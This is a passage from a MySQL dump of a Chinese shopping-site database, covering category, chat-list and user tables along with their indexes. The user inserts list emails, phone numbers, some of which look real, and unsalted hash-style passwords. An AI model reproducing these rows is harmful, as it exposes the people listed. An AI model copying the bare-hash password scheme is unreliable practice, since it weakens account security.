('F5FC5833-D59D-66FE-A96A-E628E4A0E6EC', '6G运存+128G内存 银钻灰', 9999, 10, '433DA60D-5065-1301-48B8-76D1BB06CDF0'),
('F829C720-8DB9-2405-98C8-C8FE4A163B72', '限时优惠价', 1, 2000, '54BD8F84-B0F0-2F73-E5AE-DFB102E48C79'),
('F8C4BF69-7FBA-3C5A-427D-48DB44C51DA8', '大款红色', 99, 38, '47D002AB-DFA4-11CF-52FB-398122144EF1'),
('F8C53600-8CAE-83AA-2683-D8A9F8AD08C7', '白色', 18, 666, '21B3CE06-EBCB-ECA1-E311-88D1C759C156');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_talklist`
--

CREATE TABLE `shopp_talklist` (
  `id` char(36) NOT NULL,
  `user_id` char(36) NOT NULL,
  `time` varchar(40) NOT NULL,
  `content` varchar(255) NOT NULL,
  `key` char(36) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- 表的结构 `shopp_type`
--

CREATE TABLE `shopp_type` (
  `id` char(36) NOT NULL,
  `content` text NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_type`
--

INSERT INTO `shopp_type` (`id`, `content`) VALUES
('035979B6-A44A-32EA-646F-28A51C607A73', '手机数码'),
('25D26743-4E79-4489-AB85-C6B773BA6588', '美食'),
('57F48D6B-76A0-36DB-5F9B-103D007B9B9C', '服装'),
('7629D45C-386F-E1B0-F529-F268771CE43D', '二手市场'),
('A2AF9D4A-D613-0A44-353C-F015BB16F24A', '生活超市'),
('B619C389-BE62-40B1-0F25-4B5E60B356D2', '家电'),
('C2CFEB29-044B-1003-2BBA-F0EBF3F1CA3B', '租车'),
('D6B7AFDA-D508-4B1D-0D09-8AE2740A3485', '日常用品'),
('D85D8F1F-D978-E0E3-DEE5-6B6F1C93255A', '上门维修'),
('E310BC0C-CBB9-5D9B-B198-EE79D1D2A875', '外卖'),
('F994FC1C-7A5F-16A6-70E4-1672633B13D6', '美妆'),
('FCDB71E5-E93E-7BBC-6ADD-9DB3EE39B6F4', '图书');

-- --------------------------------------------------------

--
-- 表的结构 `shopp_user`
--

CREATE TABLE `shopp_user` (
  `id` char(36) NOT NULL,
  `email` varchar(30) NOT NULL,
  `user_name` varchar(30) NOT NULL,
  `password` varchar(40) NOT NULL,
  `nick_name` varchar(20) DEFAULT NULL COMMENT '昵称',
  `phone` varchar(20) NOT NULL,
  `icon` varchar(250) NOT NULL COMMENT '头像',
  `sbasb` varchar(250) DEFAULT '',
  `role_id` char(36) DEFAULT NULL,
  `creation_time` varchar(50) NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- 转存表中的数据 `shopp_user`
--

INSERT INTO `shopp_user` (`id`, `email`, `user_name`, `password`, `nick_name`, `phone`, `icon`, `sbasb`, `role_id`, `creation_time`) VALUES
('039B2CF4-D872-080B-2E0F-D97589250C5D', '12345@qq.com', '啊哔哩', 'ae4db9947811ed8bf02f041a6eb5323591b12e7c', NULL, '147258399', '201702181841206215.png', '', '580D6AAE-5B5A-914B-5838-CD052F819229', '1511055968'),
('10A7C5E7-090A-25C8-9C27-61B921F8FA49', '369258@qq.com', '爱丽丝', '47f709d1885d2395f547426155beefa448c3eceb', NULL, '12345678910', '201702181841206215.png', '', '580D6AAE-5B5A-914B-5838-CD052F819229', '1511055968'),
('23D07CF8-C7AA-8FD9-7D5D-EEDC16768C80', '97282882929@qq.com', '啊丽丽', '87c4e8d6bcc1cbf7dab39ab99e94cf085a5a58cf', NULL, '1234567890', '201702181841206215.png', '', '580D6AAE-5B5A-914B-5838-CD052F819229', '1511053540'),
('426D79CF-279A-2033-0A77-72166CC15CC1', 'test3@qq.com', 'test3', '5162736a116c118de3794a98cfbad7a17da14180', NULL, '3333', '201703121108522629.png', '', 'F966ADA4-6A49-30FC-EF47-D6B1BF8F3BDC', '1482860943'),
('5D754767-F3D5-1D93-E588-856B288B08CC', 'admin@qq.com', 'admin', '0ec0cebaee2a51bb93589ef32bb8341a228f320d', NULL, '11111', '201612231058437310.png', '', 'F966ADA4-6A49-30FC-EF47-D6B1BF8F3BDC', '1482860943'),
('6D9C443A-C6B4-9EAF-CD78-DF28D1BA8780', '123456@qq.com', '呆呆', '47f709d1885d2395f547426155beefa448c3eceb', '小呆呆', '12345678963', '201702181841206215.png', '', '580D6AAE-5B5A-914B-5838-CD052F819229', '1510939166'),
('85FDE52D-4895-A4CE-82E7-2C6CDB8DB7B1', '1253783434@qq.com', 'sai 2', '567c8e6fc53d73ea5ee5ee891f2196c9dcbd3b43', NULL, '17620823292', '201704250212115188.png', '', '580D6AAE-5B5A-914B-5838-CD052F819229', '1493057531'),
('90360C11-DAD9-FAEB-0B35-E5FBA3465373', '1491427887@qq.com', '刘先生', '99346a81c7eb4832f6d078e79580e413d062dd67', '无限非', '18407721575', '201711072346535074.png', '爱是什么', '580D6AAE-5B5A-914B-5838-CD052F819229', '1509772441'),
('98EB35BE-CB9E-82A3-C458-5CD2A21BF59D', 'test1@qq.com', '张三ss211', '0cff20526af50e37b8fe8c49313f2ae1a1e622ab', '张三疯ss2', '176200152902', '201704181650396346.png', '有个性！没签名！ss2', '580D6AAE-5B5A-914B-5838-CD052F819229', '1482860943'),
('9ABCC594-A89C-F8C1-527F-4542D55DEBDA', 'laibaobao@qq.com', '赖宝宝', '7cc8ddeb7c309c48cebf2d4e34b9fbafa48c0658', NULL, '18277494519', '201704140016278511.png', '', '580D6AAE-5B5A-914B-5838-CD052F819229', '1482860943'),
('AA692D26-B786-D8A0-1420-F8F33264485C', 'home@qq.com', '张三', '67f8fabb2588f0458e77a71eed57eccc3c6771f3', '须尽欢', '15207714044', '201709251041428309.png', '请开始你的表演', '580D6AAE-5B5A-914B-5838-CD052F819229', '1482860943'),
('B21F9581-65EA-6F68-8FAA-57E5CFA2B419', 'xiao@qq.com', 'xiao', 'eef1d677c6fc888a831d42c9b6d087b33f9f48c4', NULL, '15277176161', '201805100954544305.png', '', '580D6AAE-5B5A-914B-5838-CD052F819229', '1525917294');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `shopp_address`
--
ALTER TABLE `shopp_address`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_authority`
--
ALTER TABLE `shopp_authority`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_auth_group`
--
ALTER TABLE `shopp_auth_group`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_auth_group_access`
--
ALTER TABLE `shopp_auth_group_access`
  ADD UNIQUE KEY `uid_group_id` (`uid`,`group_id`),
  ADD KEY `uid` (`uid`),
  ADD KEY `group_id` (`group_id`);

--
-- Indexes for table `shopp_auth_rule`
--
ALTER TABLE `shopp_auth_rule`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `name` (`name`);

--
-- Indexes for table `shopp_cart`
--
ALTER TABLE `shopp_cart`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_cart_specification`
--
ALTER TABLE `shopp_cart_specification`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_code`
--
ALTER TABLE `shopp_code`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_collect`
--
ALTER TABLE `shopp_collect`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_comment`
--
ALTER TABLE `shopp_comment`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_comment_images`
--
ALTER TABLE `shopp_comment_images`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_comment_reply`
--
ALTER TABLE `shopp_comment_reply`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_commodity`
--
ALTER TABLE `shopp_commodity`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_commodity_images`
--
ALTER TABLE `shopp_commodity_images`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_count`
--
ALTER TABLE `shopp_count`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_feedback`
--
ALTER TABLE `shopp_feedback`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_images`
--
ALTER TABLE `shopp_images`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_image_type`
--
ALTER TABLE `shopp_image_type`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_message`
--
ALTER TABLE `shopp_message`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_order`
--
ALTER TABLE `shopp_order`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_order_specification`
--
ALTER TABLE `shopp_order_specification`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_refunds`
--
ALTER TABLE `shopp_refunds`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_role`
--
ALTER TABLE `shopp_role`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_specification`
--
ALTER TABLE `shopp_specification`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_talklist`
--
ALTER TABLE `shopp_talklist`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_type`
--
ALTER TABLE `shopp_type`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `shopp_user`
--
ALTER TABLE `shopp_user`
  ADD PRIMARY KEY (`id`);

--
-- 在导出的表使用AUTO_INCREMENT
--

--
-- 使用表AUTO_INCREMENT `shopp_auth_rule`
--
ALTER TABLE `shopp_auth_rule`
  MODIFY `id` mediumint(8) UNSIGNED NOT NULL AUTO_INCREMENT;
--
-- 使用表AUTO_INCREMENT `shopp_count`
--
ALTER TABLE `shopp_count`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
